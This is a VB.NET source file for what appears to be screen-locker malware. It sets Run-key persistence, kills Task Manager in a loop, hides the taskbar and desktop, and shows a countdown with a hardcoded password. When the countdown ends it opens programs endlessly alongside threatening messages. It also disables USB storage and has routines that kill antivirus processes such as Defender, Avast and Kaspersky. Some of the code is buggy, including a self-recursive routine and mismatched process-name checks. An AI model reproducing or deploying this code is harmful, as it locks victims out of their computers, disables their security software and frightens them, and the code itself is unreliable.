Imports Microsoft.Win32
Imports System.Runtime.InteropServices

Public Class Form1
    Dim TimesTried As String = 0
    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(260) 'Change Timer///
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32
    Public Const SWP_HIDEWINDOW = &H80
    Public Const SWP_SHOWWINDOW = &H40
    Public Const SW_HIDE As Int32 = 0
    Public Const SW_RESTORE As Int32 = 9
    Dim taskBar As Integer
    Private vbAppWindows As Integer
    Public Property Button1 As Object
    <DllImport("winmm.dll")>
    Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
    End Function

    Public Sub RunAtStartup(ByVal ApplicationName As String, ByVal ApplicationPath As String)
        Dim CU As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        With CU
            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)

            .SetValue(ApplicationName, ApplicationPath)

        End With
    End Sub


    Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Startup///
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub  'This allows the program to autorun on restart

    Private Sub smartscreen()
        Dim filepath As String
        Dim registrykey As Object
        filepath = Environ("homedrive") + "\programdata\smartscreen.exe"
        registrykey = CreateObject("Wscript.Shell")
        registrykey.regwrite("HKCU\software\microsoft\windows\currentversion\run\smartscreen", filepath)
        smartscreen()
    End Sub

    Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer) 'refuses shutdown
        If UnloadMode = vbAppWindows Then Cancel = True
    End Sub

    Private Sub Block(sender As Object, e As EventArgs) ' Continuation of Block for Task Manager 
        Dim t As New Threading.Thread(AddressOf block)
        t.Start()
    End Sub
    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next

            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)
        Me.Text = "opened"
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
        taskBar = FindWindow("Shell_traywnd", "")
        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'This will "HIDE" your taskbar/// To bring back taskbar, simply change the end to: SWP_SHOWWINDOW///
        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager")
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_HIDE) 'Type "RESTORE" to bring back///
        End If
        My.Computer.Audio.Play(My.Resources.Corium, AudioPlayMode.Background)
        Application.Restart()
    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles TxtPassword.Click
        If Timer2.Enabled = False Then

        End If
        If TextBox1.Text = "iamtheone" Then
            Application.Exit()
            Application.Restart()
        End If
        MsgBox("Access Denied")
        My.Computer.Audio.Play(My.Resources.incorrect, AudioPlayMode.Background)
        TimesTried += 1
        If TimesTried = 3 Then
            MsgBox("Incorrect code. You will now have to wait an hour before you can apply the correct code. We are monitoring your every move.")
            My.Computer.Audio.Play(My.Resources.warning, AudioPlayMode.Background)
            Timer1.Enabled = True
        End If
        If TimesTried < 3 Then
            MsgBox("Wrong KeyCode " & TimesTried & " You Have Used Up Your 3 Attempt")
        End If
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("hh\:mm\:ss")
        Else
            Label1.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>
            Application.Restart()
            Do
                Process.Start("notepad")
                MsgBox("I AM ETERNAL")
                Process.Start("wmplayer")
                MsgBox("I CAN'T BE STOPPED")
                Process.Start("chrome")
                MsgBox("I MUST TERMINATE")
                Process.Start("wordpad")
                MsgBox("I WILL DESTROY YOU")
                Process.Start("firefox")
                MsgBox("THIS ISN'T THE END")
                Process.Start("opera")
            Loop


        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        TimesTried = 0
        Timer1.Enabled = False
    End Sub

    Private Sub BlockUSBPort(sender As Object, e As EventArgs)
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
        regKey.SetValue("Start", 4)
    End Sub

    Sub Antiasquared()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "a2servic.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMsMpEng()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "MsMpEng.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAvast()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ashWebSv.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAVG()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "avgemc.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiBitDefender()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "bdagent"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiKaspersky()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "avp"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMalwarebytes()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "mbam"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMcAfee()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "mcagent" & "mcuimgr"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNOD32()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "egui"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNorton()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ccapp.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub Antisandboxie()
        On Error Resume Next
        If Me.Text.Contains("#") Then
            Me.Close()
        Else
            Me.Show()
        End If
    End Sub
End Class